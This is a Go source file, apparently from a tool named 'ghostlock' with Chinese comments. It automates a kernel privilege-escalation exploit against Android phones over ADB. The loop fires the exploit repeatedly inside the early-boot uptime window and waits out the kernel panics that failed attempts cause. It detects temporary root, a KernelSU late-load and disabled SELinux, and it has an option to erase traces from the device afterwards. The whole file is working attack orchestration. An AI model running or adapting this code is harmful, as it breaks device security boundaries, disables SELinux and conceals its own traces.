package run

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"

	"ghostlock/internal/assets"
	"ghostlock/internal/device"
	"ghostlock/internal/ko"
	mgrapi "ghostlock/internal/manager"
	"ghostlock/internal/profile"
	"ghostlock/internal/stage"
)

// LoopOptions drives the unattended mode: fire, wait for the phone to reboot
// after a miss, fire again as soon as it is back inside the uptime window.
//
// The gate matters. The exploit only lands reliably in the first tens of
// seconds after boot, so an attempt on a phone that has been up for an hour is
// a guaranteed miss (and a reboot).
type LoopOptions struct {
	Base        *Options
	Rounds      int    // 轮数上限，0 = 不限
	PerBoot     int    // 每次开机窗口内连发几次
	Window      int    // uptime 窗口上沿（秒）：v1.1 明文是 90
	MinUptime   int    // 下沿（秒），0 = 不等；见 README 的实测数据
	Timeout     int    // 单次发射等待（秒）
	CycleWait   int    // 等设备自己重启（秒）
	RebootFirst bool   // 先主动重启再打
	AutoReboot  bool   // 一轮干净失败（没有 panic）时，主动重启进下一轮
	Payload     string // auto | native | vrpatch
	Out         io.Writer
}

func (lo *LoopOptions) printf(f string, a ...any) {
	if lo.Out != nil {
		fmt.Fprintf(lo.Out, f, a...)
	}
}

// loadKo resolves, validates and reads a kernelsu module the user picked.
func loadKo(selector, kernelRelease string) ([]byte, string, string, error) {
	mod, err := ko.Resolve(selector, ko.DefaultDir())
	if err != nil {
		return nil, "", "", err
	}
	ok, why := mod.Compatible(kernelRelease)
	if !ok {
		return nil, "", "", fmt.Errorf("%s：%s", mod.File, why)
	}
	data, err := os.ReadFile(mod.Path)
	if err != nil {
		return nil, "", "", err
	}
	return data, mod.File, why, nil
}

// Loop runs the unattended retry loop and returns the first winning result.
func Loop(lo *LoopOptions) (*Result, error) {
	o := lo.Base
	if o == nil {
		return nil, fmt.Errorf("loop 缺少基础参数")
	}
	if lo.Out != nil {
		o.Out = lo.Out
	}
	if lo.Rounds <= 0 {
		lo.Rounds = 10
	}
	if lo.PerBoot <= 0 {
		lo.PerBoot = 6
	}
	if lo.Window <= 0 {
		lo.Window = 90
	}
	if lo.Timeout <= 0 {
		lo.Timeout = 180
	}
	if v := os.Getenv("GHOSTLOCK_MIN_UPTIME"); v != "" && lo.MinUptime == 0 {
		fmt.Sscanf(v, "%d", &lo.MinUptime)
	}
	if lo.CycleWait <= 0 {
		lo.CycleWait = 600
	}
	if lo.Payload == "" {
		lo.Payload = "auto"
	}

	facts, err := stage.Probe(o.ADB)
	if err != nil {
		return nil, err
	}
	lo.printf("• 设备    %s (%s) android %s, kernel %s"+nl, facts.Model, facts.Product, facts.AndroidVer, facts.KernelRelease)
	lo.printf("• selinux %s   kmi %s"+nl, facts.Selinux, orDash(facts.Kmi))

	// --reboot-first must happen before the root check: a reboot is exactly how
	// you clear a previous late-load, so checking first would skip the run.
	if lo.RebootFirst && o.ADB.IsRoot() {
		lo.printf(nl + "[i] 设备当前是 root（上次 late-load 还在），先重启清掉再打" + nl)
		if err := o.ADB.Reboot(); err != nil {
			return nil, err
		}
		if facts, err = stage.Probe(o.ADB); err != nil {
			return nil, err
		}
		lo.RebootFirst = false
	}
	if o.ADB.IsRoot() {
		lo.printf(nl + "[+] 设备已经是 root（su 可用），不用再打。" + nl)
		return &Result{KsuLoaded: true, TempRoot: true}, nil
	}

	var blob []byte
	if o.BlobPath == "" && o.ConfPath == "" {
		if b, ok := verifiedBlob(o, facts.KernelRelease); ok {
			blob = b
			lo.printf("• blob    内嵌已验证 profile（%d 字节）"+nl, len(b))
		}
	}
	if blob != nil {
		// already resolved
	} else if o.BlobPath != "" {
		b, rel, err := loadBlob(o.BlobPath, facts.KernelRelease)
		if err != nil {
			return nil, err
		}
		blob = b
		lo.printf("• blob    %s（release %s，%d 字节）"+nl, o.BlobPath, rel, len(b))
	} else {
		p, confName, err := resolveProfile(o, facts)
		if err != nil {
			return nil, err
		}
		if problems := p.Validate(); len(problems) > 0 {
			for _, prob := range problems {
				lo.printf("  ! %s"+nl, prob)
			}
			return nil, fmt.Errorf("profile 不可用，拒绝上机")
		}
		b, err := p.Encode()
		if err != nil {
			return nil, err
		}
		blob = b
		lo.printf("• profile %s (route %s)"+nl, confName, p.Route)
	}

	manager := o.ManagerPkg
	if manager == "" {
		manager = facts.ManagerPkg
	}
	kmi := o.Kmi
	if kmi == "" {
		kmi = facts.Kmi
	}

	var userKo []byte
	if o.KoPath != "" {
		data, name, why, err := loadKo(o.KoPath, facts.KernelRelease)
		if err != nil {
			return nil, err
		}
		userKo = data
		lo.printf("• ko      %s（%s）→ 走 ksud wrapper：先 insmod 它，再跑正常 late-load"+nl, name, why)
	}

	// 管理器包名只解析一次（此时设备在跑，pm 可用）。绝不能放在每轮发射前：
	// 那会给发射路径塞进最多十几秒的探测开销，直接把 uptime 时机毁掉。
	if o.ManagerPkg == "" {
		if apks := mgrapi.FindAPKs(); len(apks) > 0 {
			newest := apks[len(apks)-1]
			if info, aerr := mgrapi.InspectAPK(newest); aerr == nil && info.Package != "" && info.Package != mgrapi.ConfiguredManager() {
				lo.printf("! 同级目录发现 %s（%s），但当前配置的管理器是 %s"+nl,
					filepath.Base(newest), info.Package, orDash(mgrapi.ConfiguredManager()))
				lo.printf("  想换用它就先跑: ghostlock manager install" + nl)
			}
		}
		if pkg, rerr := stage.RefreshManager(o.ADB, o.Remote, ""); rerr == nil && pkg != "" {
			manager = pkg
			lo.printf("• manager %s（已写入 .gl_ksu_pkg）"+nl, pkg)
		} else {
			lo.printf("! 没能确定管理器包名，内核里 manager uid 会留 0" + nl)
		}
	}

	files, err := stage.Push(o.ADB, stage.Options{
		Loader:      o.Loader,
		Remote:      o.Remote,
		ProfileBlob: blob,
		ManagerPkg:  manager,
		Kmi:         kmi,
		WithVrPatch: !o.NoVrPatch,
		UserKo:      userKo,
		RunScript:   true,
		ForceAttack: o.Force,
	})
	if err != nil {
		return nil, err
	}
	if files.KsudWrapper != "" {
		lo.printf("• ksud    wrapper 就位：%s"+nl, files.KsudWrapper)
	}
	if manager == "" {
		lo.printf("! 没有安装 KSU 系管理器：late-load 没人接管，root 留不住" + nl)
	}

	if lo.RebootFirst {
		lo.printf(nl + "[*] 先重启，抢开机窗口…" + nl)
		if err := o.ADB.Reboot(); err != nil {
			return nil, err
		}
	}

	lo.printf(nl+"[i] 最多 %d 轮 × 每轮 %d 次；uptime 窗口 %ds；失败由手机自己重启"+nl,
		lo.Rounds, lo.PerBoot, lo.Window)

	for r := 1; r <= lo.Rounds; r++ {
		lo.printf(nl+"================ 第 %d/%d 轮 ================"+nl, r, lo.Rounds)

		// 关键：失败本身会让内核 panic 并自动重启（这就是这个 bug 的表现），
		// 所以绝对不能每轮再手动 adb reboot —— 手动重启后 adb 恢复得比 panic
		// 重启快，会在 uptime 11~13s 就发射，而那时基本打不中。正确做法是
		// panic 之后等设备自己起来，等它回来时 uptime 自然落在 30~50s。
		if r == 1 && lo.RebootFirst {
			lo.printf("[*] 首次主动重启（清掉可能残留的旧 late-load）" + nl)
			if err := o.ADB.Reboot(); err != nil {
				lo.printf("[!] 重启后没等到设备: %v"+nl, err)
			}
		}
		if !o.ADB.WaitShell(180 * time.Second) {
			lo.printf("[!] 180s 没等到 adb shell，跳过本轮" + nl)
			continue
		}
		up, err := o.ADB.Uptime()
		if err != nil {
			lo.printf("[!] 读不到 uptime: %v"+nl, err)
			continue
		}
		lo.printf("[i] uptime=%.0fs"+nl, up)
		if lo.MinUptime > 0 && int(up) < lo.MinUptime {
			wait := lo.MinUptime - int(up)
			lo.printf("[i] 等 %ds 让 uptime 到 %ds"+nl, wait, lo.MinUptime)
			time.Sleep(time.Duration(wait) * time.Second)
			if up, err = o.ADB.Uptime(); err != nil {
				continue
			}
			lo.printf("[i] uptime=%.0fs"+nl, up)
		}
		if int(up) > lo.Window {
			lo.printf("[i] 已超出窗口 %ds，等设备重启"+nl, lo.Window)
			if !o.ADB.WaitShell(180 * time.Second) {
				lo.printf("[!] 设备没回来" + nl)
			}
			continue
		}

		dropped := false
		for n := 1; n <= lo.PerBoot; n++ {
			mode := "native"
			switch lo.Payload {
			case "vrpatch":
				mode = "vrpatch"
			case "auto":
				// 同一个开机窗口里交替两套：奇数次用 26.1（自带 vr guard），
				// 偶数次用 v1.2 + vrpatch.ko。两种失败形态不同，交替能覆盖更多。
				if n%2 == 0 {
					mode = "vrpatch"
				}
			}
			lo.printf("---- 第 %d 轮 / 第 %d 次（uptime=%.0fs, %s）----"+nl, r, n, up, mode)
			res := fire(o.ADB, files, lo.Timeout, mode, lo.printf)
			if res.TempRoot && !res.Won {
				// 临时 root 已经拿到（root 脚本以 uid0 跑过），内核状态（cred /
				// SELinux / vrpatch）已经被改过。这时再发第二发只会 panic 重启，
				// 把刚拿到的 root 一起弄没。
				lo.printf("[!] 临时 root 已拿到，但 KernelSU 未加载")
				lo.printf("    停止本轮：内核状态已改过，再发射会 panic 重启")
				if res.Tail != "" {
					lo.printf("    %s"+nl, res.Tail)
				}
				return &Result{TempRoot: true, Notes: []string{"KSU 未加载：" + res.Tail}}, nil
			}
			if res.Won {
				if o.CleanAfter {
					if gone, cerr := stage.Clean(o.ADB, stage.CleanOptions{Remote: o.Remote}); cerr == nil {
						lo.printf(nl+"[*] 已清理设备痕迹: %s"+nl, strings.Join(gone, ", "))
					}
				}
				lo.printf(nl + "[+] 成功：root 已在（KernelSU late-load）" + nl)
				lo.printf("    用法: adb shell su -c id" + nl)
				lo.printf("    注意: late-load 只在内存里，硬重启就没了，重启后重跑。" + nl)
				return &Result{TempRoot: true, KsuLoaded: true, SelinuxOff: true}, nil
			}
			if res.Tail != "" {
				lo.printf("    %s"+nl, res.Tail)
			}
			if res.Dropped {
				dropped = true
				lo.printf("[!] panic 重启 —— 等设备自己回来（不手动重启）" + nl)
				break
			}
			if n+1 <= lo.PerBoot {
				if up2, e := o.ADB.Uptime(); e == nil {
					up = up2
				}
			}
		}

		if !dropped {
			// 干净退出（没 panic）不会触发自动重启，这里才需要我们自己重启。
			lo.printf("[i] 本轮没中（干净退出），主动重启进下一轮" + nl)
			if err := o.ADB.Reboot(); err != nil {
				lo.printf("[!] 重启失败: %v"+nl, err)
			}
		} else {
			lo.printf("[i] 等 panic 重启完成…" + nl)
			if !o.ADB.WaitShell(180 * time.Second) {
				lo.printf("[!] 设备没回来，主动重启" + nl)
				_ = o.ADB.Reboot()
			}
		}
	}
	return &Result{Notes: []string{"轮数用尽"}}, nil
}

type fireResult struct {
	Won      bool
	Dropped  bool
	TempRoot bool // root 脚本已经以 uid0 启动过：内核状态已被改动，绝不能再发第二发
	Tail     string
}

// fire launches one attempt in the background and watches its KSU log for the
// success marker, while detecting the panic/reboot a miss causes.
func fire(a *device.ADB, f *stage.Files, timeout int, mode string, say func(string, ...any)) *fireResult {
	ts := fmt.Sprintf("%d", time.Now().UnixNano()/int64(time.Millisecond))
	launch := fmt.Sprintf("cd %s && GL_RUN_ID=%s setsid sh %s %s </dev/null >/dev/null 2>&1 & echo go",
		f.Remote, ts, f.RunScript, mode)
	if _, err := a.Shell(launch); err != nil {
		return &fireResult{Dropped: true}
	}
	ksuLog := f.Remote + "/ksu-" + ts + ".log"
	nativeLog := f.Remote + "/native-" + ts + ".log"
	rcFile := f.Remote + "/native-" + ts + ".rc"

	res := &fireResult{}
	deadline := time.Now().Add(time.Duration(timeout) * time.Second)
	handoff := false
	for time.Now().Before(deadline) {
		time.Sleep(700 * time.Millisecond)
		if !a.AliveFast() {
			res.Dropped = true
			return res
		}
		klog, _ := a.ShellTrim("cat " + ksuLog + " 2>/dev/null")
		if strings.Contains(klog, "KernelSU module loaded") {
			res.Won = true
			return res
		}
		if strings.Contains(klog, "fixup failed") ||
			strings.Contains(klog, "KernelSU module not loaded") ||
			strings.Contains(klog, "ksud missing") {
			res.Tail = lastLines(klog, 3)
			return res
		}
		if strings.Contains(klog, "root script start") {
			res.TempRoot = true
			if !handoff {
				handoff = true
				deadline = time.Now().Add(120 * time.Second)
				say("    [i] root 脚本已启动（uid0），等 policy / vrpatch / late-load")
			}
			continue
		}
		if out, _ := a.Shell("test -f " + rcFile + " && echo y"); strings.Contains(out, "y") {
			// native 退出了，但 root 脚本是它 fork 出去的后台进程，日志往往
			// 晚几秒才写完。所以不能只看 ksu log —— 直接问内核：模块在不在。
			if rooted(a) {
				res.Won = true
				return res
			}
			time.Sleep(3 * time.Second)
			if klog2, _ := a.ShellTrim("cat " + ksuLog + " 2>/dev/null"); strings.Contains(klog2, "KernelSU module loaded") || rooted(a) {
				res.Won = true
				return res
			}
			nlog, _ := a.ShellTrim("tail -n 3 " + nativeLog + " 2>/dev/null")
			res.Tail = lastLine(nlog)
			return res
		}
	}
	return res
}

// lastLine keeps the last non-empty line, trimmed, for the live progress line.
func lastLine(s string) string {
	out := ""
	for _, l := range strings.Split(s, nl) {
		l = strings.TrimSpace(stripANSI(l))
		if l != "" {
			out = l
		}
	}
	if len(out) > 160 {
		out = out[:160]
	}
	return out
}

// stripANSI removes the color escapes the native binary emits.
func stripANSI(s string) string {
	for {
		i := strings.Index(s, string([]byte{0x1b})+"[")
		if i < 0 {
			return s
		}
		j := i + 2
		for j < len(s) && (s[j] < 0x40 || s[j] > 0x7e) {
			j++
		}
		if j < len(s) {
			j++
		}
		s = s[:i] + s[j:]
	}
}

// loadBlob reads a ready-made profile blob and checks it was built for this
// exact kernel. A foreign release means every offset inside is wrong.
func loadBlob(path, kernelRelease string) ([]byte, string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, "", err
	}
	d, err := profile.Decode(data)
	if err != nil {
		return nil, "", fmt.Errorf("%s: %w", path, err)
	}
	if d.Release != kernelRelease {
		return nil, "", fmt.Errorf("blob 的 release 是 %q，设备是 %q —— 偏移会对不上", d.Release, kernelRelease)
	}
	return data, d.Release, nil
}

// verifiedBlob returns the profile blob that was field-tested on this exact
// kernel, if one is bundled and its release matches.
func verifiedBlob(o *Options, kernelRelease string) ([]byte, bool) {
	if o.Loader == nil {
		return nil, false
	}
	data, err := o.Loader.Read(assets.VerifiedBlobName)
	if err != nil {
		return nil, false
	}
	d, err := profile.Decode(data)
	if err != nil || d.Release != kernelRelease {
		return nil, false
	}
	return data, true
}

// rooted asks the device itself whether the late-load already landed. The
// exploit can succeed while its own stdout/log never says so (the root script
// runs detached and is killed by the panic moments later).
func rooted(a *device.ADB) bool {
	if a.HasModule("kernelsu") {
		return true
	}
	return a.IsRoot()
}

// lastLines keeps the last n non-empty lines, for a short failure digest.
func lastLines(s string, n int) string {
	var keep []string
	for _, l := range strings.Split(s, nl) {
		l = strings.TrimSpace(stripANSI(l))
		if l != "" {
			keep = append(keep, l)
		}
	}
	if len(keep) > n {
		keep = keep[len(keep)-n:]
	}
	out := strings.Join(keep, " | ")
	if len(out) > 240 {
		out = out[:240]
	}
	return out
}
